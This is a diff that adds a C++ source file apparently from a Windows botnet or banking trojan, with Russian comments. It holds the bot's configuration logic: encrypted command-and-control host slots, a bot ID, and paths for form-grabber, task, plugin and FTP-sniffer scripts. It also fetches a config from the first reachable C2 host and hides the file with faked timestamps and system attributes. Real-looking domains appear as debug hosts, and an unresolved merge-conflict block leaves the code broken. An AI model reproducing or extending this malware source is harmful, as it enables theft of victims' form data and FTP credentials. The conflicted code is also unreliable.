@@ -1,0 +1,262 @@
+#include <windows.h>
+
+#include "Config.h"
+#include "GetApi.h"
+#include "Memory.h"
+#include "Strings.h"
+#include "Utils.h"
+#include "Crypt.h"
+#include "BotUtils.h"
+#include "Loader.h"
+#include "Task.h"
+#include "BotClasses.h"
+#include "BotDebug.h"
+
+
+char MainHost_1[] = "FULL_URL_1__________________________________________________________________________________________";
+char MainHost_2[] = "FULL_URL_2__________________________________________________________________________________________";
+char MainHost_3[] = "FULL_URL_3__________________________________________________________________________________________";
+
+// Все хосты с которыми работает бот
+PCHAR BotHosts[] = {MainHost_1, MainHost_2, MainHost_3};
+
+
+char Delay[]  = "DELAY_";
+
+char BOT_PREFIX[] = "BOT_UID_____________";
+
+
+// Адреса скриптов
+char PathConfig[]     = {'/','c','f','g','/',0};
+char PathGrabber[]    = {'/','g','e','t','/','f','g','r','.','h','t','m','l',0};
+char PathTask[]       = {'/','s','e','t','/','t','a','s','k','.','h','t','m','l',0};
+char PathPlugins[]    = {'/','s','e','t','/','p','l','u','g','s','.','h','t','m','l',0};
+char PathFTPSniffer[] = {'/','g','e','t','/','s','n','i','.','h','t','m','l',0};
+
+#ifdef DEBUGCONFIG
+
+	//char DebugHost[255] = "apartman-adriana.com";
+<<<<<<< .mine
+    //char DebugHost[255] = "botadmin";
+	//char DebugHost[255] = "apartman-adriana.com";
+	char DebugHost[255] = "check.ples.in";
+=======
+    char DebugHost[255] = "botadmin";
+	//char DebugHost[255] = "apartman-adriana.com";
+>>>>>>> .r101
+
+	DWORD DebugDelay = 1;
+	char DebugBotPrefix[] = "tstru";
+#endif
+
+
+char *GetPrefix()
+{
+	#ifdef DEBUGCONFIG
+		return DebugBotPrefix;
+	#endif
+
+	char *Ret = Decrypt(BOT_PREFIX);
+	return Ret;
+}
+
+PCHAR GetMainHostByID(BYTE ID)
+{
+	// Получчить имя хоста по номеру
+	switch (ID)
+	{
+	case 0: return MainHost_1;
+	case 1: return MainHost_2;
+	case 2: return MainHost_3;
+    default:
+        return NULL;
+	}
+}
+
+PCHAR GetScriptByID(BYTE ID, bool &Created)
+{
+	// Получить адрес скрипта по его номеру
+	switch (ID)
+	{
+	case ScriptConfig:
+		Created = true;
+		return StrNew(2, PathConfig, GetPrefix());
+
+	case ScriptFormGrabber: return PathGrabber;
+	case ScriptTask:        return PathTask;
+	case ScriptPlugins:     return PathPlugins;
+	case ScriptFTPSniffer:  return PathFTPSniffer;
+
+	default:
+	   return NULL;
+	}
+}
+
+
+
+int GetDelay()
+{
+	#ifdef DEBUGCONFIG
+		return DebugDelay;
+	#endif
+
+	return m_atoi( Delay );
+}
+
+#ifdef DEBUGCONFIG
+	// В отладочном режиме предоставляем возможность установить отладочный хост
+	
+	void SetDebugHost(PCHAR Host)
+	{
+		
+		if (!StrCopy(DebugHost, Host))
+        	StrCopy(DebugHost, "localhost");
+	}
+#endif
+
+
+char *GetCurrentHost()
+{
+	#ifdef DEBUGCONFIG
+		return DebugHost;
+	#endif
+
+
+	// ЭТОТ БРЕД ПЕРЕПМСАТЬ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+	char *Ret = NULL;
+
+	char CurrentHost[ 128 ];
+
+	m_lstrcpy( CurrentHost, Decrypt( MainHost_1 ) );
+
+	if ( CheckHost( CurrentHost ) )
+	{
+		Ret = CurrentHost;
+	}
+	else
+	{
+		m_lstrcpy( CurrentHost, Decrypt( MainHost_2 ) );
+
+		if ( CheckHost( CurrentHost ) )
+		{
+			Ret = CurrentHost;
+		}
+		else
+		{
+			m_lstrcpy( CurrentHost, Decrypt( MainHost_3 ) );
+
+			if ( CheckHost( CurrentHost ) )
+			{
+				Ret = CurrentHost;
+			}
+		}
+	}	
+
+	return Ret;
+}
+
+PCHAR GetCurrentHost2()
+{
+	// Функция возвращает первый рабочий адрес из массива используемых хостов
+	#ifdef DEBUGCONFIG
+		return DebugHost;
+	#endif
+
+	PCHAR Result = NULL;
+	BYTE i = 0;
+	do
+	{
+		PCHAR Host = GetMainHostByID(i); 
+		if (Host == NULL)
+			break;
+		Result = StrNew(Decrypt(Host));
+		i++;
+
+		if (CheckHost(Result))
+			break;
+		StrFree2(Result);
+	}
+	while (1);
+
+	return Result;
+}
+
+PCHAR GetBotScriptURL(BYTE Script)
+{
+	// Функция возвращает полный адрес скрипта
+    bool PathCreated = false;
+	PCHAR Path = GetScriptByID(Script, PathCreated);
+
+
+	if (Path == NULL)
+		return NULL;
+	
+
+	PCHAR Host = GetCurrentHost2();
+	if (Host == NULL)
+		return NULL;
+
+    PCHAR Result = StrNew(3, "http://", Host, Path);
+
+	StrFree(Host);
+	if (PathCreated)
+		StrFree(Path);
+
+	return Result;
+}
+
+
+bool DownloadCfg( char *Url )
+{
+	bool Ret = false;
+
+	WCHAR *TempFileName = GetTempName();
+	WCHAR *CfgPath  = GetCfgPath();
+
+	if (TempFileName == NULL  || CfgPath == NULL)
+		return false;
+
+	// Загружаем файл
+	if (DownloadInFile(Url, TempFileName) && FileExistsW(TempFileName))
+	{
+		HANDLE File	= (HANDLE)pCreateFileW(TempFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
+		if (File != INVALID_HANDLE_VALUE)
+		{
+			char Signature[] = {'B','J','B',0};
+			DWORD SignatureLen = 3;
+
+			PCHAR Buf = StrAlloc(SignatureLen);
+            DWORD Readed = 0;
+
+			if (pReadFile(File, Buf, SignatureLen, &Readed, NULL))
+				Ret = StrSame(Signature, Buf);
+
+			StrFree(Buf);
+            pCloseHandle(File);
+		}
+
+		if (Ret)
+		{
+            // Копируем файл на постоянное место локации
+			pSetFileAttributesW(CfgPath, FILE_ATTRIBUTE_ARCHIVE );
+			pMoveFileExW(TempFileName, CfgPath, MOVEFILE_REPLACE_EXISTING);
+			SetFakeFileDateTime( CfgPath );
+			pSetFileAttributesW( CfgPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
+		}
+        pDeleteFileW(TempFileName);
+	}
+
+	return Ret;
+}
+
+
+void InstallConfig()
+{
+    PCHAR URL = GetBotScriptURL(ScriptConfig);
+	DownloadCfg(URL);
+	StrFree(URL);
+
+}
+
+
+
